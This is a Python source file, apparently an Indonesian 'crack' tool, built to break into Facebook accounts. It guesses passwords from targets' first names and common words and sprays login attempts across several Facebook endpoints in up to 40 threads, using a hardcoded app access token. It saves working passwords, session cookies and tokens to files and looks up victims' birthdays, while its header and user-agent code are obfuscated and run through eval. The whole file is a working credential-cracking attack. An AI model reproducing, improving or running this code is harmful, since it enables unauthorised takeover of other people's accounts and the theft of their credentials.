



ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg=(lambda _____,____:____(_____))((lambda ___,____:___(___,____))(lambda ____,___:chr(___%256)+____(____,___//256) if ___ else "",(lambda _,__:_(__))(eval((lambda ___,__,_____:__.join([___(____) for ____ in _____]))(chr,"",[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 114, 97, 110, 100, 111, 109, 34, 41, 46, 99, 104, 111, 105, 99, 101])),[6297961025794013827582531529954534898468534421452438195666174242058130473092719621715818444445464363875181322125114283653603489129623670631151833327446916498313506577613491499322953810881902279782336109204040467944893789238661404186322313772158729711341268968900389826873843144626501173102492493790311885721906935894151697776236881233790639459616446942601213067577651756251242033291165375918403960134468770663132160976518515500436036016357928781, 5327860128214865028175001289310637553352240890519155227598432602127837477170461994193430445453664495970509456923817766144254549172673590949844302831218355218311697815071014339274170364405933607124191336617012282460682167308898779418186925641326102071396783773538691779538488782000054554627034073186656213441301384383315832114832176378221274235682886861204130625218867901147166150978564893146840493191883026253, 25160108094899449162951425975378385725128734036588502356161918407669732134615542850236642702765522429659625404722984819471821573281151124449040810850165819306247073618511593326889826816050704554624622930489984677019643697215454564144797134077409004515493793085214579112372150474522322423231839902676204605950031706811624311045190343480442580635269790828136325737915929232936557460482546576706368001800318646032690050820634119401293, 10350268133212802698945065212566572261738989404368008010552920544107315570136966426395029400782630895240826369812243424334528653133250699000961275275503819556340710312144434345624450209413267909711608248134914036959232118094639100650253894091253027724165870563652406237902776544899034507999175498370211955749535606339447605756052810848827230718912294091898470609569871811555400037992524718037402393306319142017833930690430383200199731800315110386320409320726508307749282292985216412898857480013, 1499659305506911823925460933171414478130861165320187947521324131745742330040296594341476463979449999939104343738649986187921928975909262224048445867324103525769865800948559895204440981018593574015634869769356610256435547678836361762836776750615000668456997729682277724350290766190736349827240833534317926663002843277111085677905666845622685620513220445096798763242730904671979290893127567652811545773724836667146763532660557, 118815251172730401468188061135178627184041060237867198981676033293811180272288745014438633989391589427239393907638203258954923998240285665723386873691573974843077601408319407635415036214780601269857719937594232848549052829809598429230282856814652008539823325781887514031473329879774781389696720612547066422044920261503701846434447068180100114789012278870351876622484435469445545653925471806916106300609998189108330907848620516080960073583503149612298061, 118815251172730401468188061135178627184041060237867198981676033293811180272288745014438633989391589427239393907638189016162540033352122747242873441226357565471437198398589436597802991101365122550850080056385191397493422755808943335756308134607976785429893891381628413519410649793427627834548181063994234797786097443011581893672293581277305084153437985940610344396130240106033840007774242573946961626165611076825523418678165958240383922260157168965283661, 98281672245700973292779007716321819238784117330423837328757490363864955769157377417112843974227899885778114586681697670229745468852484223285846982662533036876236983474023195707769716778951241380141111895912314584157904097061738580779109396496529234895294021757491491497612186727275801697467489434295771506431825678653963317467668318404030602420565366364516794936034407141843350599948659479499383333186262410634661956348641177421, 865360926901622935064063198269403707426744710519241020454087806063391617063770220948833046958875933336549216733971916243242400594034738513379028717350279404091886992315783374451703030864744706471125166142783788748757114300128273749544629199996887807004941009038240142720393980317821751588747205572547332191303529925610988096697063152125312208537612313101463246356411750644409583197774615927337813354946252328347220573404228050479684416223858784760625868156377014049037688828597923751017135568615109868316591098207250575181, 47792394411172160756648045205452950810247193995434961490960356051207360844599505331305372127683022081137273533102993262007288700664037012434673631613084610780852580743503630379138583577676249212199103918726210058689574538656588757940839394831491053319061886880677622363601909568718558200664948737780142988891873898140710238205813939195438344259376087316678810404092666678014732784192302912978002086018002670336820959476721081874607937290179359911430117393905673514989502037333030967159505575577330474884675857657457380301631309, 2649668642102477490929936694417042499005181287518210050701547720847956286172110558782174397686436179626887164172210240277114251571886380533077451683510430709844755126280557527064163080602215753380111968132720799858456351102911025788152506553706833687894432335121550057509964782984222316571000081320525380388338420081210805670358949446666789910057810968634524587307276933743411606821761238255822235329894899068061387287241692308569218970632751226225483814951391308111759966568304173559304458760013, 2649668642102477490929936694417042499005181287518210050701547537601793278551382317149484919587446875950550980624295873071315818648546904766131445864838511280716500695300580348818171951276560614134782083970677816558556251748343553324071223969947639607970082163053506537264633061142913719710098287924447221657215731467881293891337158993220335236915435853471760861927789236842748238379431082762151916529238983926090313351633106154717393959666087147629525630015275503520971248296573615680492685389645])),eval((lambda ___,__,_____:__.join([___(____) for ____ in _____]))(chr,"",[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 117, 114, 108, 108, 105, 98, 46, 114, 101, 113, 117, 101, 115, 116, 34, 41, 46, 114, 101, 113, 117, 101, 115, 116, 46, 117, 110, 113, 117, 111, 116, 101])))
ok,cp,cout,live,chek,kumpul,lahir=0,0,0,[],[],[],""
pw_tambahan="""

kontol|sayang|indonesia|bajingan|anjing

""".strip().split("|")
ngntd=((())>(()))+((())>(()))
def awok(ngentod):
        return [ngentod,ngentod+"1234",ngentod+"123456",ngentod+"123",ngentod+"12345"]
def pw_list(ngentot):
        if len(ngentot)==2:
                aap_afandi=ngentot[1].split(" ")
                if len(aap_afandi[ngntd])!=ngntd:
                        asu=awok(aap_afandi[ngntd].lower())
                        if len(aap_afandi[ngntd]) < 6:
                                del asu[ngntd]
                                [asu.append(x) for x in pw_tambahan]
                        else:
                                [asu.append(x) for x in pw_tambahan]
                else: asu=pw_tambahan
        else: asu=pw_tambahan
        return asu

class crack:
        def __init__(self,url,user):

                print()
                self.url=url
                self.user=user
                self.token=open("cookies/token.txt").read() if os.path.exists("cookies/token.txt") else None
                self.naroskeun()

        def naroskeun(self):
                NAROSKEUN=input(" ? Crack Menggunakan Password Otomatis / Manual O/M : ")
                while NAROSKEUN in (""," "):
                        print(f" ! {kosong1}")
                        NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
                if NAROSKEUN in tuple("mM"):
                        print(" * Ketik 'first' Untuk Menggunakan Nama Depannya")
                        print(" * Contoh : first123,first12345,bajingan,sayang,kintl")
                        password=input(f" ? {c}Password :{m} ")
                        print(f"{q}")
                        while len(password) < 6:
                                print(f" ! {c}{kosong1}{q}" if password in (""," ") else " ! {m}Password Minimanl 6 Huruf{q}")
                                password=input(" ? set password : ")
                        print(f"\n * Pilih Method Login {m}!!{q}")
                        print(f" 1. {k}B-Api Facebook{q}  ( Fast )")
                        print(f" 2. {k}Free Facebook{q} ( Medium )")
                        print(f" 3. {k}MBasic Facebook{q} ( Slow )")
                        print(f" 4. {k}Mobile Facebook{q} ( Super Slow )")
                        self.awokawok_ngentod(password)
                        self.awokawok_ngentod(password.split(","))
                if NAROSKEUN in tuple("oO"):
                        print(f" * Pilih Method Login {m}!!{q}")
                        print(f" 1. {k}B-Api Facebook{q}  ( Fast )")
                        print(f" 2. {k}Free Facebook{q} ( Medium )")
                        print(f" 3. {k}MBasic Facebook{q} ( Slow )")
                        print(f" 4. {k}Mobile Facebook{q} ( Super Slow )")
                        self.awokawok_ngentod()
                else:
                        print(" ! Anda Tau Kntl");self.naroskeun()

        def lovyu(self,username,password,url,**data):
                ses=req.session()
                ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
                parsing=parser(respon.text,"html.parser")
                action=parsing.find("form",{"method":"post"})["action"]
                kecuali=["sign_up","_fb_noscript"]
                for INPUT in parsing.find_all("input",{"value":True}):
                        if INPUT["name"] in kecuali:
                                continue
                        else:
                                data.update({INPUT["name"]:INPUT["value"]})
                data.update({"email":username,"pass":password})
                ses.headers.update({"content-type":"application/x-www-form-urlencoded","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
                ses.post(url+action,data=data,allow_redirects=False)
                return ses.cookies.get_dict()

        def fckyu(self,username,password,url,**data):
                ses=req.session()
                ses.headers.update({"Host":url.split("//")[1],"upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
                parsing=parser(respon.text,"html.parser")
                action=parsing.find("form",{"method":"post"})["action"]
                dtsg=re.findall('{"dtsg":{"token":"(.*?)"',respon.text)
                time=int(datetime.now().timestamp())
                kecuali=["sign_up","_fb_noscript"]
                for INPUT in parsing.find_all("input",{"value":True}):
                        if INPUT["name"] in kecuali:
                                continue
                        else:
                                data.update({INPUT["name"]:INPUT["value"]})
                data.update({"email":username,"pass":password,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":"false","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true"})
                if dtsg:
                        data.update({"fb_dtsg":dtsg[0]})
                ses.headers.update({"cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
                ses.post(url+action,data=data,allow_redirects=False)
                return ses.cookies.get_dict()

        def bapi(self,username,password):
                ses=req.session()
                ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
                ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
                return ses.get("https://b-api.facebook.com/method/auth.login").json()

        def awokawok_ngentod(self,manual=None):
                pilih=input(" ? Ngab : ")
                while pilih in (""," "):
                        print(f" ! {m}{kosong2}{q}")
                        pilih=input(" ? pilih : ")
                url="https://{}.facebook.com"
                speed=40 if manual is None else 30
                if speed==30:
                        speed=40 if len(manual.split(",")) <= 5 else 30
                if pilih in ("1","01"):
                        #print(" * token found :D" if self.token else " ! token not found")
                        tod=self.awikwok()
                        self.attack(self.bapi,speed,manual,url,tod)
                        self.result()
                if pilih in ("2","02"):
                        #print(" * token found :D" if self.token else " ! token not found")
                        tod=self.awikwok()
                        self.attack(self.lovyu,speed,manual,url.format("free"),tod)
                        self.result()
                if pilih in ("3","03"):
                        #print(" * token found :D" if self.token else " ! token not found")
                        tod=self.awikwok()
                        self.attack(self.lovyu,speed,manual,url.format("mbasic"),tod)
                        self.result()
                if pilih in ("4","04"):
                        tod=self.awikwok()
                        self.attack(self.fckyu,speed,manual,url.format("m"),tod)
                        self.result()
                else:
                        print(" ! {m}{pilih}{q}");self.awokawok_ngentod(manual)

        def attack(self,login,speed,password,url,tolol):
                for pengguna in self.user:
                        membagi=pengguna.split("(Aap Gans)")
                        if password:
                                if "first" in password:
                                        if len(membagi[1].split(" "))!=0:
                                                kumpul.append({"username":membagi[0],"password":password.replace("first",membagi[1].split(" ")[0].lower()).split(",")})
                                else:
                                        kumpul.append({"username":membagi[0],"password":password.split(",")})
                        else:
                                kumpul.append({"username":membagi[0],"password":pw_list(membagi)})
                print(f"{c}! Cracking Start !!\n{k} * Ctrl + Z Untuk Stop !!\n")
                with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
                        if "bapi" in str(login):
                                for x in kumpul:
                                        U.submit(self.log_bapics,x["username"],x["password"],login,tolol)
                        else:
                                for x in kumpul:
                                        U.submit(self.log_mbasic,x["username"],x["password"],login,url,tolol)

        def log_mbasic(self,username,list_password,login,url,ttl):
                try:
                        global ok,cp,cout,lahir
                        for password in list_password:
                                rincian=login(username,password,url)
                                if "c_user" in rincian:
                                        ok+=1
                                        (lambda cookies,uid: self.save(f"\x1b[1;32m*--> {uid}|{password}|{cookies}","Hasil/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
                                if "checkpoint" in rincian:
                                        cp+=1
                                        uid=json.loads(urllib.request.unquote(rincian["checkpoint"]))["u"]
                                        if ttl:
                                                lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
                                                lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
                                        self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","Hasil/chek.txt",chek);break
                                else:
                                        continue
                        cout+=1
                        print(f"\r ! CRACKING {cout}/{len(self.user)} OK:-{ok} CP:-{cp}",end="")
                except:
                        self.log_mbasic(username,list_password,login,url,ttl)

        def log_bapics(self,username,list_password,login,ttl):
                try:
                        global ok,cp,cout,lahir
                        for password in list_password:
                                rincian=login(username,password)
                                if "session_key" in str(rincian) and "EAAA" in str(rincian):
                                        ok+=1
                                        (lambda token,uid:self.save(f"\x1b[1;32m*--> {uid}|{password}|{token}","Hasil/live.txt",live))(rincian["access_token"],rincian["uid"]);break
                                if "www.facebook.com" in rincian["error_msg"]:
                                        cp+=1
                                        uid=username
                                        if "request_args" in rincian:
                                                # menghindari nyasar :v
                                                for x in rincian["request_args"]:
                                                        if "email" in x["key"]:
                                                                uid=x["value"];break
                                        if ttl:
                                                lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
                                                lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
                                        self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","Hasil/chek.txt",chek);break
                                else:
                                        continue
                        cout+=1
                        print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
                except:
                        self.log_bapics(username,list_password,login,ttl)

        def save(self,*memek):
                view=memek[0]
                print(f"\r {view}\x1b[0m\n",end="")
                open(memek[1],"a").write(re.findall("> (.+)",view)[0]+"\n")
                memek[2].append(view)

        def result(self):
                if len(live)!=0 or len(chek)!=0:
                        print(f"\n* Crack Done {m}!!{q}\n ! Live/Chck: {len(live)}/{len(chek)}")
                        if len(live)!=0:
                                print(f" ! {i2}Hasil Crack Suksess DiSave Di{q}: Hasil/live.txt")
                        if len(chek)!=0:
                                print(f" ! {k2}Hasil Crack Cheack DiSave Di{q}: Hasil/chek.txt")
                        exit()
                else:
                        exit("\n\n ! Tidak Ada Hasil")

        def awikwok(self):
                if self.token:
                        n=input(" ? Crack + Tanggal Lahir Y/T : ")
                        if n in tuple("yY"):
                                return True
                        if n in tuple("tT"):
                                return False
                        else:
                                print(f" ! {pilih1}");self.awikwok()
